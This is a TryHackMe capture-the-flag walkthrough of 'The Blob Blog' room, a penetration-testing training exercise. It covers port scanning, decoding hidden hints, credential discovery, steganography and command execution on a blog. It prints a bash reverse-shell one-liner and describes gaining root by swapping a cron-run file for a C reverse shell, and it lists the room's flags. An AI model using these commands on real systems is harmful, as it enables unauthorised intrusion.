# The Blob Blog

![](Attachment/Banner.png)
**Room:** [The Blob Blog](https://tryhackme.com/room/theblobblog)  
**Platform:** TryHackMe  
**Difficulty:** Medium  

---
## 1. Reconnaissance

Started with an Nmap scan to identify open ports and running services.

```bash
nmap -sV -A 10.49.135.82 -oN nmap -vv
```

Initial findings:
```
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 62 OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 62 Apache httpd 2.4.7 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
```

## Web
> Source code Port 80
![](Attachment/page.png)

```
K1stLS0+Kys8XT4rLisrK1stPisrKys8XT4uLS0tLisrKysrKysrKy4tWy0+KysrKys8XT4tLisrKytbL
...
Base64
...
PF0+LS4tLVstLS0+Kys8XT4tLg==
```
Cipher -> Base64 decode -> Brainfuck -> Text
```
When I was a kid, my friends and I would always knock on 3 of our neighbors doors.  Always houses 1, then 3, then 5!
```

![](Attachment/knock.png)


A subsequent scan revealed additional services:
```
PORT     STATE SERVICE REASON         VERSION
21/tcp   open  ftp     syn-ack ttl 62 vsftpd 3.0.2
22/tcp   open  ssh     syn-ack ttl 62 OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu 
80/tcp   open  http    syn-ack ttl 62 Apache httpd 2.4.7 ((Ubuntu))
445/tcp  open  http    syn-ack ttl 62 Apache httpd 2.4.7 ((Ubuntu))
8080/tcp open  http    syn-ack ttl 62 Werkzeug httpd 1.0.1 (Python 3.5.3)
```

![](Attachment/password.png)

```
<!--
Dang it Bob, why do you always forget your password?
I'll encode for you here so nobody else can figure out what it is: 
HcfP8J54AK4
-->
```

view-source:http://10.49.135.82:445/
```
<!--
Bob, I swear to goodness, if you can't remember p@55w0rd 
It's not that hard
-->
```

![](Attachment/password-1.png)
> cUpC4k3s

Using these creds to login to FTP
![](Attachment/ftp.png)


```
ftp> get cool.jpeg
local: cool.jpeg remote: cool.jpeg
229 Entering Extended Passive Mode (|||9745|).
150 Opening BINARY mode data connection for cool.jpeg (8183 bytes).
100% |******************************************************************************|  8183       44.84 MiB/s    00:00 ETA
226 Transfer complete.
8183 bytes received in 00:00 (39.10 KiB/s)

```

![](Attachment/stegcracker.png)

```
steghide extract -sf  cool.jpeg
Enter passphrase: 
wrote extracted data to "out.txt".
```

```
cat out.txt             
zcv:p1fd3v3amT@55n0pr
/bobs_safe_for_stuff
```

> http://10.49.135.82:445/bobs_safe_for_stuff
```
Remember this next time bob, you need it to get into the blog! I'm taking this down tomorrow, so write it down!
- youmayenter
```

![](Attachment/445.png)
/user --> http://10.49.135.82:445/user

```
-----BEGIN OPENSSH PRIVATE KEY-----
KSHyMzjjE...
-----END OPENSSH PRIVATE KEY-----

```


![](Attachment/vig.png)
> bob:d1ff3r3ntP@55w0rd

##  Web Enumeration
![](Attachment/login%20page.png)

> After Login 
![](Attachment/login.png)

Trying `ls` command execute 
![](Attachment/ls.png)
# Initial Access
> https://www.revshells.com/

```
/bin/bash -i >& /dev/tcp/IP/PORT 0>&1
```

![](Attachment/shell.png)

![](Attachment/4000.png)

```
/usr/bin/blogFeedback 6 5 4 3 2 1
```

![](Attachment/priv.png)

crontabs
![](Attachment/crontab.png)

![](Attachment/userflag.png)

### User Flag
```
THM{C0NGR4t$_g3++ing_this_fur}
```

# Enumeration

![](Attachment/cronjob.png)


# Privilege Escalation – Root

https://github.com/izenynn/c-reverse-shell/blob/main/linux.c

Replace the this file with the reverse shell of C
![](Attachment/root.png)

```
THM{G00D_J0B_G3++1NG+H3R3!}
```

---
**Thanks for reading! Happy Hacking.**
